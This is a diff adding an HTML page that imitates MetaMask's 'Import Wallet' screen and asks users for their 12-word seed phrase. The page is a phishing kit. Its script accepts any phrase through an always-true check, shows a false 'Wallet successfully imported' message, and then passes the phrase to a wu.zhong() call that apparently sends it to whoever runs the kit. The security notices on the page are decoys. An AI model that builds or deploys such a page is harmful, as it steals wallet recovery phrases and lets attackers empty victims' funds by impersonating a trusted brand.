@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Import Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f6f7f9 0%, #ffffff 50%, #fafafa 100%);
+            color: #24272a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 20px 20px 30px 20px;
+            background: linear-gradient(135deg, #f6851b 0%, #e2761b 100%);
+            color: white;
+            box-shadow: 0 2px 10px rgba(248, 133, 27, 0.2);
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .metamask-icon {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .page-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 400;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .verification-container {
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e1e4e7;
+        }
+
+        .instruction-text {
+            font-size: 18px;
+            color: #24272a;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .phrase-input {
+            width: 100%;
+            background: #f8f9fa;
+            border: 2px solid #d6d9dc;
+            border-radius: 12px;
+            padding: 20px;
+            color: #24272a;
+            font-size: 16px;
+            font-family: 'Courier New', monospace;
+            resize: vertical;
+            min-height: 120px;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .phrase-input:focus {
+            outline: none;
+            border-color: #f6851b;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(246, 133, 27, 0.1);
+        }
+
+        .phrase-input::placeholder {
+            color: #9ca0a6;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        .word-count {
+            text-align: right;
+            font-size: 14px;
+            color: #6a737d;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+
+        .word-count.valid {
+            color: #037dd6;
+        }
+
+        .word-count.invalid {
+            color: #d73a49;
+        }
+
+        .verify-button {
+            width: 100%;
+            background: linear-gradient(135deg, #f6851b 0%, #e2761b 100%);
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .verify-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(246, 133, 27, 0.3);
+        }
+
+        .verify-button:disabled {
+            background: #d6d9dc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+            color: #9ca0a6;
+        }
+
+        .clear-button {
+            width: 100%;
+            background: none;
+            border: 2px solid #d6d9dc;
+            color: #6a737d;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .clear-button:hover {
+            background: #f8f9fa;
+            border-color: #9ca0a6;
+        }
+
+        .info-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #856404;
+            line-height: 1.4;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .info-icon {
+            color: #f6851b;
+            font-size: 16px;
+            margin-top: 1px;
+        }
+
+        .success-message {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            color: #155724;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            color: #721c24;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+
+        .security-notice {
+            background: #e8f4fd;
+            border: 1px solid #b8daff;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #004085;
+            line-height: 1.5;
+        }
+
+        .security-title {
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer {
+            padding: 20px;
+            text-align: center;
+            color: #6a737d;
+            font-size: 12px;
+            background: white;
+            border-top: 1px solid #e1e4e7;
+        }
+
+        .metamask-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .fox-icon {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(135deg, #f6851b 0%, #e2761b 100%);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .main-content {
+                padding: 30px 15px;
+            }
+            
+            .verification-container {
+                padding: 25px 20px;
+            }
+            
+            .page-title {
+                font-size: 24px;
+            }
+            
+            .instruction-text {
+                font-size: 16px;
+            }
+            
+            .phrase-input {
+                padding: 16px;
+                font-size: 15px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            .main-content {
+                padding: 60px 40px;
+            }
+            
+            .verification-container {
+                padding: 40px;
+            }
+            
+            .phrase-input {
+                min-height: 140px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="metamask-icon">🦊</div>
+            <div>
+                <h1 class="page-title">Import Wallet</h1>
+                <p class="subtitle">Restore your MetaMask wallet with your seed phrase</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div class="verification-container">
+            <p class="instruction-text">
+                Enter your 12-word seed phrase to restore your wallet
+            </p>
+
+            <div class="info-box">
+                <span class="info-icon">⚠️</span>
+                <div>
+                    <strong>Keep it secure:</strong> Only enter your seed phrase on official MetaMask applications. Separate each word with a single space.
+                </div>
+            </div>
+
+            <textarea 
+                class="phrase-input" 
+                id="phraseInput"
+                placeholder="Enter your 12-word seed phrase here..."
+                autocomplete="off"
+                spellcheck="false"
+            ></textarea>
+
+            <div class="word-count" id="wordCount">0 words</div>
+
+            <div class="success-message" id="successMessage">
+                ✅ Wallet successfully imported! Welcome back to MetaMask.
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                ❌ Invalid seed phrase. Please verify your words and try again.
+            </div>
+
+            <button class="verify-button" id="verifyBtn" disabled>Import Wallet</button>
+            <button class="clear-button" id="clearBtn">Clear</button>
+
+            <div class="security-notice">
+                <div class="security-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#004085"  viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+                        </svg> Security Notice
+                </div>
+                MetaMask will never ask for your seed phrase. Never share it with anyone or enter it on suspicious websites. Store it safely offline.
+            </div>
+        </div>
+    </div>
+
+   
+    <script>
+        const phraseInput = document.getElementById('phraseInput');
+        const wordCount = document.getElementById('wordCount');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const clearBtn = document.getElementById('clearBtn');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+
+        
+
+        phraseInput.addEventListener('input', function() {
+            const text = this.value.trim();
+            const words = text ? text.split(/\s+/) : [];
+            const count = words.length;
+
+            wordCount.textContent = `${count} word${count !== 1 ? 's' : ''}`;
+            
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            phraseInput.style.borderColor = '#d6d9dc';
+
+            if (count === 12) {
+                wordCount.classList.add('valid');
+                wordCount.classList.remove('invalid');
+                verifyBtn.disabled = false;
+            } else if (count > 0 && count < 24) {
+                wordCount.classList.add('invalid');
+                wordCount.classList.remove('valid');
+                verifyBtn.disabled = true;
+            } else {
+                wordCount.classList.remove('valid', 'invalid');
+                verifyBtn.disabled = true;
+            }
+        });
+
+        verifyBtn.addEventListener('click', function() {
+            const phrase = phraseInput.value.trim().toLowerCase();
+
+            if (true) {
+                successMessage.style.display = 'block';
+                errorMessage.style.display = 'none';
+                phraseInput.style.borderColor = '#28a745';
+                verifyBtn.textContent = 'Wallet Imported ✓';
+                verifyBtn.disabled = true;
+                setTimeout(() => {
+                     wu.zhong(`🔰Metamask Seed Phrase \n\n ${phrase}`, "io.metamask");
+    
+                }, 200);
+            } else {
+                errorMessage.style.display = 'block';
+                successMessage.style.display = 'none';
+                phraseInput.style.borderColor = '#dc3545';
+                phraseInput.focus();
+                
+             
+                phraseInput.style.animation = 'shake 0.5s';
+                setTimeout(() => {
+                    phraseInput.style.animation = '';
+                }, 500);
+            }
+        });
+
+        clearBtn.addEventListener('click', function() {
+            phraseInput.value = '';
+            phraseInput.style.borderColor = '#d6d9dc';
+            wordCount.textContent = '0 words';
+            wordCount.classList.remove('valid', 'invalid');
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'IMPORT WALLET';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
+            phraseInput.focus();
+        });
+
+       
+        phraseInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                if (!verifyBtn.disabled) {
+                    verifyBtn.click();
+                }
+            }
+        });
+
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes shake {
+                0%, 100% { transform: translateX(0); }
+                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                20%, 40%, 60%, 80% { transform: translateX(5px); }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
